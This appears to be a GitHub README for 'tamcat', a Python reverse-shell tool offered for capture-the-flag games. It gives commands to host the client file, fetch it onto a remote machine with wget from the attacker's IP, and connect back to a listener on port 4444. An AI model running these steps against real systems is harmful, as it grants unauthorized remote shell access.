# tamcat
What is tamcat ?
TamCat is a python reverse shell to help you in ctf
# REVERSE SHELL PYTHON
*by arvialo*

**SETUP TAMCAT**
```bash
ON LOCAL :

git clone https://github.com/Arvialo/tamXX
cd tamXX
pip3 install -r requirements.txt # only for attacker
chmod +x tamServ.py
```

**SEND FILE TO REMOTE**
```bash
ON LOCAL :
python3 -m http.server [or python -m SimpleHTTPServer]

ON REMOTE
wget http://[IP]:8000/tamCli.py # only tamCli file is useful
```

**USE TAMCAT**
```bash
ON LOCAL : 
./tamServ.py -l -p 4444

ON REMOTE :
python3 tamCli.py --target [IP] -p 4444 --prompt
```
